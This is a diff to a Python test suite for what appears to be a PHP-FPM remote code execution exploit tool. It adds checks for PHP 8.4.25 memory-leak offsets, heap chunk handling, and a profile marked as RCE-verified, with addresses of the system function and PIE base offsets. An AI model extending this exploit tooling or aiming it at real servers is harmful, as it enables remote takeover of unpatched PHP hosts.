@@ -56,6 +56,12 @@ class LeakTests(unittest.TestCase):
         self.assertEqual(g["chunk_ptr_off"], 0x77F8)
         self.assertEqual(g["pie_ptr_off"], 0x157E8)
 
+    def test_leak_geometry_8425_pie_offset(self):
+        g = fpm._leak_geometry("8.4.25")
+        self.assertIsNotNone(g)
+        self.assertEqual(g["pie_base_off"], 0x4E9FC7)
+        self.assertEqual(g["pads"], [32768, 16384])
+
 
 class NoOracleRemoteModeTests(unittest.TestCase):
     """--no-oracle must not silently read local /proc when remote."""
@@ -163,9 +169,16 @@ class EndgamePayloadTests(unittest.TestCase):
         self.assertEqual(self.buf[self._off(D + 0x898) + len(CMD)], 0)
 
 
+class OracleChunkTests(unittest.TestCase):
+    def test_chunk_base_handles_merged_anonymous_mapping(self):
+        oracle = object.__new__(fpm.Oracle)
+        oracle.maps = [(0x7F0000000000, 0x7F0000230000, "rw-p")]
+        self.assertEqual(oracle.chunk_base(0x7F0000081000), 0x7F0000000000)
+
+
 class ProfileConsistencyTests(unittest.TestCase):
-    def _profile(self) -> dict:
-        return json.loads((ROOT / "profiles" / "8.4.26-fpm.json").read_text())
+    def _profile(self, version: str = "8.4.26") -> dict:
+        return json.loads((ROOT / "profiles" / f"{version}-fpm.json").read_text())
 
     def test_fpm_profile_matches_module_constants(self):
         meta = self._profile()["fpm"]
@@ -185,13 +198,25 @@ class ProfileConsistencyTests(unittest.TestCase):
         self.assertEqual(profile["fixed_in"], "8.4.27")
         self.assertEqual(profile["libphp"]["zif_system"], "0x386660")
 
+    def test_fpm_8425_profile_is_rce_verified(self):
+        profile = self._profile("8.4.25")
+        self.assertTrue(profile["rce"])
+        self.assertTrue(profile["verified"])
+        self.assertEqual(profile["fixed_in"], "8.4.27")
+        self.assertEqual(profile["libphp"]["zif_system"], "0x386460")
+        self.assertEqual(profile["fpm"]["reclaim_pads"], [4096, 4096])
+        self.assertEqual(profile["fpm"]["no_oracle"]["candidates"],
+                         [{"d_off": "0x7f000", "k": "0xfe8"}])
+
     def test_fpm_profile_validates_against_schema(self):
         try:
             import jsonschema
         except ImportError:
             self.skipTest("jsonschema not installed")
         schema = json.loads((ROOT / "profiles" / "schema.json").read_text())
-        jsonschema.validate(self._profile(), schema)
+        for version in ("8.4.25", "8.4.26"):
+            with self.subTest(version=version):
+                jsonschema.validate(self._profile(version), schema)
 
 
 LAB = os.environ.get("PHP2SHELL_FPM_LAB") == "1"
